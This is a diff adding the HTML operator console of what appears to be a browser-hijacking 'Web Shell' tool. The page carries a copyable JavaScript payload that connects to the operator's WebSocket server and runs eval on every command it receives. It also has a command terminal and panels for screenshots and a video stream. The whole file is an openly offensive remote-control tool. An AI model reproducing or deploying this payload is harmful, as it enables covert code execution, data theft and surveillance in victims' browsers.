@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Web Shell</title>
+    <style>
+        * {
+            font-family: 'Consolas', Courier, monospace;
+            border-radius: 0.5rem;
+            color: rgb(0, 255, 0);
+        }
+
+        body {
+            overflow-x: hidden;
+            width: 99vw;
+            text-align: center;
+            height: 100vh;
+            background-color: black;
+            font-family: poppins;
+            float: left;
+        }
+
+        .grid-container {
+            min-width: 98vw;
+            display: grid;
+            grid-gap: 10px;
+            grid-column-gap: 10px;
+            grid-row-gap: 10px;
+            align-items: center;
+            justify-content: center;
+            grid-template-columns: auto;
+            margin: 10px;
+        }
+
+        .grid-item {
+            margin: auto;
+            text-align: center;
+        }
+
+        .terminal {
+            width: 70vw;
+            height: 60vh;
+            border-radius: 0.5rem;
+            border: 1px solid rgba(0, 128, 0, 0.5);
+            outline: none;
+            padding: 0.5rem;
+            background: transparent;
+            resize: none;
+        }
+
+        .payload {
+            width: 70vw;
+            border: 1px solid rgba(0, 128, 0, 0.5);
+            outline: none;
+            padding: 0.5rem;
+            background: rgba(128, 128, 128, 0.1);
+            text-align: left;
+            overflow: auto;
+            position: relative;
+        }
+
+        .copy {
+            background-color: rgba(0, 255, 0);
+            color: black;
+            cursor: pointer;
+            border: 1px solid rgba(0, 128, 0, 0.5);
+        }
+
+        h5 {
+            margin-bottom: -1px;
+            width: fit-content;
+            padding: 13px;
+            border: 1px solid rgba(0, 128, 0, 0.5);
+            line-height: 10%;
+        }
+
+        .code {
+            font-family: Consolas, "courier new";
+            color: crimson;
+        }
+
+        img {
+            width: 40vw;
+            height: 40vh;
+            border-radius: 0.5rem;
+            border: 1px solid rgba(0, 128, 0, 0.5);
+            outline: none;
+            padding: 0.5rem;
+            overflow: hidden;
+        }
+
+        .stack {
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+        }
+    </style>
+</head>
+
+<body>
+    <h2>Web Shell</h2>
+    <div class="grid-container">
+        <div class="grid-item">
+            <div class="stack">
+                <h5>Payload</h5>
+                <h5 id="copy" onclick="copy()" class="copy">Copy</h5>
+            </div>
+            <div class="payload">
+                <p class="code">
+                    (() => {const socket = new WebSocket("wss://<%= url %>/shell");socket.onmessage = (e)
+                        =>socket.send(JSON.stringify(eval(e.data)))})();
+                </p>
+            </div>
+        </div>
+        <div class="grid-item">
+            <div class="stack">
+                <h5>Terminal</h5>
+                <h5 id="clear" onclick="clearTerminal()" class="copy">Clear</h5>
+            </div>
+            <textarea class="terminal"></textarea>
+        </div>
+        <div class="grid-item">
+            <h3>ScreenShot</h3>
+            <img
+                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAABmJLR0QA/wD/AP+gvaeTAAAFNklEQVR4nO3cX2gcRRwH8O9vLykmRQ9fbKn6IqhobKK5u0R9EQsiCEIFW7CobUWr6IO5klKfJCqUQNvstUXRokRQWmgetD4IbRHagKhJrs3teiWGQkEIRlvFPzS0l+z+fDCnaXp3uavz293L/T4vgZ25meG+mZmd3RBAKaWUUkoppZRSSimllFJKqQBRuYKO0fQHTEgEOZhGQYxsLmW/XKqsqdyHfMJdBA1Egk/4q1yZFeRA1NI0kIjRQCJGA4kYDSRiNJCI0UAiRgOJGA0kYqQD8ZgxyIzHPMKdbPmPANgP4Ipwv3Wr7KMTA2bB9LSbGvhiwbVzAIbbs9sPg/k4gBsF+69LcjOEaZdzdRj/chID34KRFuu7jkkF4mOF9V6lCl5r/BMAfwj1X7ekArngdOz5pVKFfFtfAcCEUP91SyQQBlrA5d+1LKi5UqL/eiYSCAE3dYylU5XqdIynbwXoXon+a8XA8X9+hE9sU2dC/4YjG2Llyv1Z9Ev2X4Os3xJ/EuD3wx4IIPuFPDpxx22H1jpv3LzwYmJsW2tHNn2ACM8K9l2tS+TRpnxbX6EZM70Afgh7QJLnEBCwEYUrj7ePbf+SwD8CvGoW9AQYt0j2Wz3uyXXbkwCQTR6cuX/k9ed8y/oaQHNYIwpiyYgD/AwDOxm0BYhGGAx85iQzHy68Nt61b5SBt8MaExCNNTwMU7Ne4aVSBW4ivgtMw0EPqKgRA/Fh0eaJ7nd/LVlKfT58awtQ/i9DJDVcIATsdjoHvqpUx+necz6sRzuNFsjpuZb4m9VUdFL2RwQMSQ9osUYK5BLY3zT/yKYqTbBeZeAnyUEt1kCBcI+T2lfTOSOb3HvRArYgwFP8cg9kihmfgmnz4lvcauWS9vEgT/GiB8MQXGDGMQJOehZO5RP2ORONNmOmdxYr1wG420R7lSynQC6DvXVuav/3phvOJg/OtI/1bALoGwArTLe/0LJZspi41xEIo8hJZk4z8I5U+0XLIhACn3A7MxXfUJoQxCk+SoFMM2M9gzYCKH2KLu1iE7AZFMCdEPX5TL4t2UUkAiFgyCugzU3ZR93kwJDnN91HoM+r+izhtWwyE9hZwS/QMABfqv2wA5lmxvpc0t6Yf9j+rXgx37V7OpcceGqp2cKMwVzCPhLISOfNj9ORaj+0QAj8sRXje9yUfbRcHTc5MESEw2WKz7d6cz1Cw6uM+aRU02Hc9k4z4xUnlSkbRFHbyI7VzHMvlCjy2cfW7x488KfA+JbEhFMEiPwyBDpDFu4V1dSP0exOAK3XFDD63S77lOnxVUtyHwkqkJJ7RSVtIztWg2hbiaIzXmv8LcPjq4nkPiIeSK2zoqjM7LgM9p6v5YmtGKF9RHIPmd8ragsCKM6OuWtmBxP3ukm503gtpPYRqUAmrRh3jz+Q+f16PtwUK3QwWzdcfZWOuZ22+Gm8Wn6BhmMr4MPwKiOzZBEfut4wACCX2HeMCS/iv43zYjP8rYGcxqsktY+IBBKj2P9+9ekm7MFiKEGfxqsmsI8YD4SBs2c695410ZabsAeJ8VDQp/FqMcH4rbfxQIjY6JeXS9kjJtszSeI8YjwQE8tVvZDYR0wHkje1XNUNw/uI2UCIG2Z2FJneR4wG0kjLVZHpfcTkwfDnOc9fs3Y0vcZgm/ViCsDtJhoyGcgqIpww2F5DCvuNoVpEA4kYDSRiNJCI0UAiRgOJGA0kYjSQiNFAIkYDiRgNJGI0kIgp+3DRYkwy6T+plGAxJsMeg1JKKaWUUkoppZRSSimllFIAgL8BrAa648EAVhkAAAAASUVORK5CYII=">
+        </div>
+        <div class="grid-item">
+            <h3>Video Stream</h2>
+                <img
+                    src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAABmJLR0QA/wD/AP+gvaeTAAAFNklEQVR4nO3cX2gcRRwH8O9vLykmRQ9fbKn6IqhobKK5u0R9EQsiCEIFW7CobUWr6IO5klKfJCqUQNvstUXRokRQWmgetD4IbRHagKhJrs3teiWGQkEIRlvFPzS0l+z+fDCnaXp3uavz293L/T4vgZ25meG+mZmd3RBAKaWUUkoppZRSSimllFJKqQBRuYKO0fQHTEgEOZhGQYxsLmW/XKqsqdyHfMJdBA1Egk/4q1yZFeRA1NI0kIjRQCJGA4kYDSRiNJCI0UAiRgOJGA0kYqQD8ZgxyIzHPMKdbPmPANgP4Ipwv3Wr7KMTA2bB9LSbGvhiwbVzAIbbs9sPg/k4gBsF+69LcjOEaZdzdRj/chID34KRFuu7jkkF4mOF9V6lCl5r/BMAfwj1X7ekArngdOz5pVKFfFtfAcCEUP91SyQQBlrA5d+1LKi5UqL/eiYSCAE3dYylU5XqdIynbwXoXon+a8XA8X9+hE9sU2dC/4YjG2Llyv1Z9Ev2X4Os3xJ/EuD3wx4IIPuFPDpxx22H1jpv3LzwYmJsW2tHNn2ACM8K9l2tS+TRpnxbX6EZM70Afgh7QJLnEBCwEYUrj7ePbf+SwD8CvGoW9AQYt0j2Wz3uyXXbkwCQTR6cuX/k9ed8y/oaQHNYIwpiyYgD/AwDOxm0BYhGGAx85iQzHy68Nt61b5SBt8MaExCNNTwMU7Ne4aVSBW4ivgtMw0EPqKgRA/Fh0eaJ7nd/LVlKfT58awtQ/i9DJDVcIATsdjoHvqpUx+necz6sRzuNFsjpuZb4m9VUdFL2RwQMSQ9osUYK5BLY3zT/yKYqTbBeZeAnyUEt1kCBcI+T2lfTOSOb3HvRArYgwFP8cg9kihmfgmnz4lvcauWS9vEgT/GiB8MQXGDGMQJOehZO5RP2ORONNmOmdxYr1wG420R7lSynQC6DvXVuav/3phvOJg/OtI/1bALoGwArTLe/0LJZspi41xEIo8hJZk4z8I5U+0XLIhACn3A7MxXfUJoQxCk+SoFMM2M9gzYCKH2KLu1iE7AZFMCdEPX5TL4t2UUkAiFgyCugzU3ZR93kwJDnN91HoM+r+izhtWwyE9hZwS/QMABfqv2wA5lmxvpc0t6Yf9j+rXgx37V7OpcceGqp2cKMwVzCPhLISOfNj9ORaj+0QAj8sRXje9yUfbRcHTc5MESEw2WKz7d6cz1Cw6uM+aRU02Hc9k4z4xUnlSkbRFHbyI7VzHMvlCjy2cfW7x488KfA+JbEhFMEiPwyBDpDFu4V1dSP0exOAK3XFDD63S77lOnxVUtyHwkqkJJ7RSVtIztWg2hbiaIzXmv8LcPjq4nkPiIeSK2zoqjM7LgM9p6v5YmtGKF9RHIPmd8ragsCKM6OuWtmBxP3ukm503gtpPYRqUAmrRh3jz+Q+f16PtwUK3QwWzdcfZWOuZ22+Gm8Wn6BhmMr4MPwKiOzZBEfut4wACCX2HeMCS/iv43zYjP8rYGcxqsktY+IBBKj2P9+9ekm7MFiKEGfxqsmsI8YD4SBs2c695410ZabsAeJ8VDQp/FqMcH4rbfxQIjY6JeXS9kjJtszSeI8YjwQE8tVvZDYR0wHkje1XNUNw/uI2UCIG2Z2FJneR4wG0kjLVZHpfcTkwfDnOc9fs3Y0vcZgm/ViCsDtJhoyGcgqIpww2F5DCvuNoVpEA4kYDSRiNJCI0UAiRgOJGA0kYjSQiNFAIkYDiRgNJGI0kIgp+3DRYkwy6T+plGAxJsMeg1JKKaWUUkoppZRSSimllFIAgL8BrAa648EAVhkAAAAASUVORK5CYII=">
+        </div>
+    </div>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        // Socket initiliazation
+        const socket = io();
+        socket.on('result', (msg) => Terminal.value += `${JSON.stringify(msg, null, 4)}\n${Shell}`);
+
+        const Shell = "# ";
+        const Terminal = document.querySelector('textarea');
+        Terminal.value = Shell;
+        Terminal.addEventListener("keyup", (e) => {
+            switch (e.keyCode) {
+                case 8:
+                    e.preventDefault();
+                    return false;
+                case 13:
+                    socket.emit('cmd', e.target.value.trim().split('\n').at(-1).replace(Shell, ''));
+                    Terminal.value += Shell
+            }
+        });
+
+        // Copy payload function
+        const copy = () => {
+            navigator.clipboard.writeText('(() => {const socket = new WebSocket("wss://<%= url %>/shell");socket.onmessage = (e) =>socket.send(JSON.stringify(eval(e.data)))})();');
+            document.getElementById('copy').textContent = "Copied";
+            setTimeout(() => {
+                document.getElementById('copy').textContent = "Copy";
+            }, 2000);
+        };
+
+        // Clear Terminal function
+        const clearTerminal = () => {
+            Terminal.value = Shell;
+            document.getElementById('clear').textContent = "Cleared";
+            setTimeout(() => {
+                document.getElementById('clear').textContent = "Clear";
+            }, 2000);
+        };
+    </script>
+</body>
+
+</html>
